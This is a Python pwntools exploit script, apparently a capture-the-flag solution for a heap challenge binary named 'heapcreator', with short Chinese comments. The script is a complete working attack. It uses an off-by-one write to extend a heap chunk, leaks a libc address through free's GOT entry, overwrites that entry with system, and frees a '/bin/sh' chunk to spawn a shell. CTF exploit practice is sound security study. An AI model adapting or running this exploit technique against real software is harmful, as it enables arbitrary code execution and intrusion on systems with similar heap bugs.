from pwn import*
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])
p = process('./heapcreator')
elf = ELF('./heapcreator')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(sizeHeap, heap):
    p.recvuntil('Your choice :')
    p.send(b'1'.ljust(4, b'\x00'))
    p.recvuntil('Size of Heap : ')
    p.send(bytes(str(sizeHeap), 'utf-8').ljust(8, b'\x00'))
    p.recvuntil('Content of heap:')
    p.send(heap)
    p.recvuntil('SuccessFul\n')
    
def edit(index, heap):
    p.recvuntil('Your choice :')
    p.send(b'2'.ljust(4, b'\x00'))
    p.recvuntil('Index :')
    p.send(bytes(str(index), 'utf-8').ljust(0x4, b'\x00'))
    p.recvuntil('Content of heap : ')
    p.send(heap)
    p.recvuntil('Done !\n')
    
def show(index):
    p.recvuntil('Your choice :')
    p.send(b'3'.ljust(4, b'\x00'))
    p.recvuntil('Index :')
    p.send(bytes(str(index), 'utf-8').ljust(0x4, b'\x00'))
    
def delete(index):
    p.recvuntil('Your choice :')
    p.send(b'4'.ljust(4, b'\x00'))
    p.recvuntil('Index :')
    p.send(bytes(str(index), 'utf-8').ljust(0x4, b'\x00'))

free_got = elf.got['free']

create(0x18, b'a' * 0x18)   # 0x20 0x20
create(0x18, b'b' * 0x18)   # 0x20 0x20
create(0x18, '/bin/sh')     # 0x20 0x20

# chunkExtend
edit(0, b'a' * 0x18 + b'\x81')
delete(1)
create(0x70, b'e' * 0x28)

# 泄露glibc地址
edit(1, b'a' * 0x28 + p64(free_got))
show(1)
p.recvuntil('Content : ')
free_addr = u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00'))
libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
print('基地址libc_base = ' + hex(libc_base))
print('system地址 = ' + hex(system_addr))

# 修改free_got为system
edit(1, p64(system_addr))

# free('/bin/sh')
delete(2)

p.interactive()